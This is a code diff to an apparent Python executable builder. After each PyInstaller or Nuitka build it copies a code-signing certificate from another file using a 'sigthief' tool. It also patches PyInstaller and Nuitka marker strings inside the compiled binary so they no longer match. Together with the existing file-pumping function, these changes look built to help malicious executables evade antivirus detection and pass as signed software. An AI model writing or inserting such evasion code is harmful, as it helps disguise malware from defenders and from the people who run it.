@@ -13,6 +13,7 @@ import time
 from PIL import Image
 from tkinter import filedialog
 from tools import upx
+from tools.sigthief import signfile
 
 logging.basicConfig(
 	level=logging.DEBUG,
@@ -571,7 +572,6 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 			except Exception as e:
 				logging.error(f"Error with config: {e}")
 
-
 	def file_pumper(self, filename, extension, size):
 		try:
 			pump_size = size * 1024 ** 2
@@ -651,6 +651,8 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 					command.insert(-1, module)
 
 				subprocess.run(command)
+				self.RemoveMetaData(f"./{filename}.exe")
+				self.AddCertificate(f"./{filename}.exe")
 				logging.info(f"Successfully compiled {filename}.exe with pyinstaller")
 
 			elif filetype == "nuitka":
@@ -681,6 +683,8 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 						logging.info(f"Successfully compiled {filename}.exe with nuitka")
 					except Exception as e:
 						logging.error(f"Error with compiling file: {e}")
+				self.RemoveMetaData(f"./{filename}.exe")
+				self.AddCertificate(f"./{filename}.exe")
 
 		except Exception as e:
 			logging.error(f"Error with compiling file: {e}")
@@ -780,6 +784,29 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 
 		except Exception as e:
 			logging.error(f"Error with building file: {e}")
+			
+	def AddCertificate(self, path: str):
+		print("Adding Certificate")
+		certFile = "cert"
+		if os.path.isfile(certFile):
+			signfile(path, certFile, path)
+
+	def RemoveMetaData(self, path: str):
+		print("Removing MetaData")
+		with open(path, "rb") as file:
+			data = file.read()
+		
+		# Remove pyInstaller strings
+		data = data.replace(b"PyInstaller:", b"PyInstallem:")
+		data = data.replace(b"pyi-runtime-tmpdir", b"bye-runtime-tmpdir")
+		data = data.replace(b"pyi-windows-manifest-filename", b"bye-windows-manifest-filename")
+		
+		# Remove Nuitka strings
+		data = data.replace(b"NUITKA_ONEFILE_PARENT", b"NUKTEM_ONEFILE_PARENT")
+		data = data.replace(b"NUITKA_ONEFILE_BINARY", b"NUKTEM_ONEFILE_BINARY")
+		
+		with open(path, "wb") as file:
+			file.write(data)
 
 
 if __name__ == "__main__":
